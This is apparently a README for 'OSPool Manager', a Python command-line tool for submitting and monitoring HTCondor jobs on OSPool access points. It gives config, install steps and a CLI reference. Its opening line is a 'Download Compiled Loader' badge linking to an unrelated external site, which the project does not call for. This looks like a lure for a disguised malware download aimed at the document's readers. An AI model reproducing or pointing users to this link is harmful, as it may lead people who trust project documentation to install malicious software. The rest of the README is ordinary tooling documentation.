# OSPool Manager

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A Python CLI for managing OSPool/HTCondor workflows. Works in two modes:

- **Local remote-submit** — run from your laptop/WSL, submit to the AP over the network using token auth.
- **On the AP** — sync the whole project to the Access Point and run `ospool` directly there.

## Workflow

```
local project
    ↓
ospool setup remote      # create dirs on AP (first time)
ospool sync remote        # rsync project to AP
    ↓
ospool submit job/dag     # submit jobs (spool or ap-project mode)
    ↓
ospool monitor [cluster]  # watch job status live
ospool logs <cluster>     # tail .out/.err from AP over SSH
    ↓
ospool fetch <cluster>    # retrieve completed outputs
```

## Folder Structure

```
ospool-manager/
├── pyproject.toml
├── config.toml
├── execution/
│   ├── workflows/          # DAGMan .dag workflow files
│   ├── submit-files/       # HTCondor .sub submit files
│   └── job-scripts/        # scripts transferred to execute nodes
├── data/                   # source data (excluded from sync by default)
├── logs/                   # job .log files (excluded from sync)
├── outputs/                # results fetched after jobs complete (excluded)
├── runs/                   # per-run metadata (excluded from sync)
└── ospool/
    ├── __init__.py
    ├── cli.py              # Typer CLI entrypoint
    ├── config.py           # loads config.toml, typed settings
    ├── remote.py           # setup_remote, sync_remote, whereami
    ├── stage.py            # Phase 1: stage data to OSDF
    ├── submit.py           # Phase 2: submit jobs and DAGs (spool / ap-project)
    ├── monitor.py          # Phase 3: watch job status, tail logs
    ├── fetch.py            # Phase 4: retrieve completed outputs
    └── token.py            # token fetch/refresh helpers
```

## Configuration

```toml
[remote]
username       = "your-username"
access_point   = "ap40.uw.osg-htc.org"
schedd_host    = "ap40.uw.osg-htc.org"
collector_host = "cm-1.ospool.osg-htc.org"
project_dir    = "/home/your-username/ospool-manager"
ssh_key        = "~/.ssh/ospool_ed25519"

[osdf]
base_path = "osdf:///ospool/ap40/data/your-username"

[local]
project_dir   = "."
execution_dir = "execution"
data_dir      = "data"
logs_dir      = "logs"
outputs_dir   = "outputs"
runs_dir      = "runs"

[submit]
mode = "spool"   # "spool" (works anywhere) or "ap-project" (requires sync first)
```

### Submit modes

| Mode | How it works | When to use |
|------|-------------|-------------|
| `spool` | `schedd.submit(spool=True)` — transfers files from local machine | Default; works from laptop/WSL with a valid auth token |
| `ap-project` | Injects `initialdir = <project_dir>` — uses already-synced files on AP | When running directly on the AP or after `ospool sync remote` |

## Installation

```bash
python -m venv .venv
source .venv/bin/activate
pip install -e .
```

Requires HTCondor2 Python bindings (`htcondor2`) and a valid auth token in `~/.condor/tokens.d/`.

Get a token with:
```bash
condor_token_fetch -authz READ -authz WRITE -token ospool
```

## CLI Reference

```
ospool whereami                        # show location, hostname, submit mode
ospool setup remote                    # SSH mkdir project tree on AP (first time)
ospool sync remote [--data]            # rsync project to AP (--data includes data/)

ospool submit job <file.sub>           # submit a single job
ospool submit dag <file.dag>           # submit a DAGMan workflow

ospool monitor [cluster_id] [-i secs]  # live job status table (Ctrl-C to stop)
ospool logs <cluster_id> [-p prefix]   # tail .out/.err from AP via SSH

ospool rm <cluster_id> [...]           # remove/kill job cluster(s)
ospool fetch <cluster_id>              # fetch completed outputs to outputs/

ospool token-fetch                     # fetch/refresh HTCondor auth token
ospool stage <path>                    # stage local data to OSDF
```

## Local Remote-Submit Workflow

Run from your laptop/WSL with `[submit] mode = "spool"`:

```bash
cd ospool-manager
ospool whereami                         # confirm: Local machine, spool mode
ospool submit job execution/submit-files/patchwork.sub
ospool monitor 12345678
ospool logs 12345678
ospool fetch 12345678
```

## AP Workflow

After syncing the project to the AP, SSH in and run `ospool` directly:

```bash
# From local machine (first time):
ospool setup remote
ospool sync remote

# SSH to AP and run:
ssh ap40.uw.osg-htc.org
cd ~/ospool-manager
python -m venv .venv
source .venv/bin/activate
pip install -e .

ospool whereami                         # confirm: Access Point (AP)
# Edit config.toml: mode = "ap-project"
ospool submit job execution/submit-files/patchwork.sub
ospool monitor 12345678
```
